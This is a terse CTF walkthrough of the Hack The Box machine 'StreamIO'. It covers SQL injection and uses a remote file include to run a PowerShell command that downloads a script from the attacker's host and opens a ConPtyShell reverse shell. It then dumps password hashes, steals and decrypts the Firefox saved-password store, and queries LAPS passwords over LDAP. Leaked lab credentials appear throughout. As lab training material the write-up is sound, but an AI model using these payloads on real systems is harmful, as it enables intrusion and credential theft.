# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings

## External
### Enumeration
![](https://i.imgur.com/REjC6ZJ.jpeg)
- `  oliver@Streamio.htb  `
- The https/http main domains are not working.
	- so i tried the watch subdomain.
- ![](https://i.imgur.com/UXV2Lep.png)
![Uploading file...q3c3j]()
- During Manual SQL injection try to use numbers on the 1st place `32'` not `a'` 
![](https://i.imgur.com/X0Xybuy.png)
![Uploading file...8sgky]()
```shell
##### db_accessadmin

3

##### db_backupoperator

3

##### db_datareader

3

##### db_datawriter

3

##### db_ddladmin

3

##### db_denydatareader

3

##### db_denydatawriter

3

##### db_owner

3

##### db_securityadmin

3

##### dbo

3

##### guest

3

##### INFORMATION_SCHEMA

3

##### sys

3

##### 2012

2009
```
![](https://i.imgur.com/di5hOLL.jpeg)

![](https://i.imgur.com/PI4SmpS.png)
` yoshihide : 66boysandgirls..`
![](https://i.imgur.com/I8XkIZ1.png)
![](https://i.imgur.com/Zykbblt.png)
![](https://i.imgur.com/ndHScG0.png)
![](https://i.imgur.com/wMyM51J.png)
```shell
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);

```
![](https://i.imgur.com/hrMLzRD.png)
![](https://i.imgur.com/bT4ZcDp.png)
- There the php is debugging the include value. so i planned to do RCE. for this i will Use [ConPTYSHELL](https://github.com/antonioCoco/ConPtyShell).
- **STEP 1**:
```shell
rexder@HunterMachine ~/C/H/M/streamio> cat rex.php
system("powershell IEX(IWR http://10.10.14.27/conpty-shell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.27 3001");
```
- **STEP 2**:
```shell
rexder@HunterMachine ~/C/H/M/streamio> python3 -m http.server 80 -d ~/Exploit/
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.158 - - [10/Jun/2024 20:15:44] "GET /conpty-shell.ps1 HTTP/1.1" 200 -
```
- Then I will type the url on the RFI and BOOm i will have windows shell
![](https://i.imgur.com/3gJjYxg.png)
### Gaining Access
![](https://i.imgur.com/m3NDgr2.png)
- I did it with metasploit too
	- ![](https://i.imgur.com/kk7UyGm.png)
## Internal
### Enumeration
`  Hash:    yoshihide::streamIO:1122334455667788:1205487ab5519030acac743e00b9f201:0101000000000000a20af4f999bbda0181c6ff19083836e5000000000800300030000000000000000000000000210000906bfdeeda0a839ff60520a0ae3ad3f29e9edc9a6e1c788ea71b73cc61fde5730a00100000000000000000000000000000000000090000000000000000000000 `
```shell
PS C:\inetpub\streamio.htb\admin> sqlcmd -U db_admin -P B1@hx31234567890 -Q 'SELECT * FROM streamio_backup..users'
sqlcmd -U db_admin -P B1@hx31234567890 -Q 'SELECT * FROM streamio_backup..users'
id          username                                           password
----------- -------------------------------------------------- --------------------------------------------------
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332
          3 James                                              c660060492d9edcaa8332d89c99c9239
          4 Theodore                                           925e5408ecb67aea449373d668b7359e
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5

(8 rows affected)

PS C:\inetpub\streamio.htb\admin> net user
net user

User accounts for \\DC

-------------------------------------------------------------------------------
Administrator            Guest                    JDgodd
krbtgt                   Martin                   nikk37
yoshihide
```
![](https://i.imgur.com/go6hH4w.png)
` nikk37 : get_dem_girls2@yahoo.com `

Winpeas Displayed
` Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db`
- So lets Crack the Firefox Password Database
```powershell
*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> download C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json

Info: Downloading C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json to logins.json

*Evil-WinRM* PS C:\Program Files> download C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db

Info: Downloading C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db to key4.db

Info: Download successful!
```
- Next we can use the `firepwd.py`
```shell
rexder@HunterMachine ~/C/H/M/streamio> python3 ~/Exploit/firepwd/firepwd.py -d .
globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
 SEQUENCE {
   SEQUENCE {

<SNIP>

clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
decrypting login/password pairs
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```
### Gaining Access
![](https://i.imgur.com/VnSB2Fp.png)
` JDgodd : JDg0dd1s@d0p3cr3@t0r `
ldapsearch -h streamio.htb -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
### Maintaining Access


# Random Notes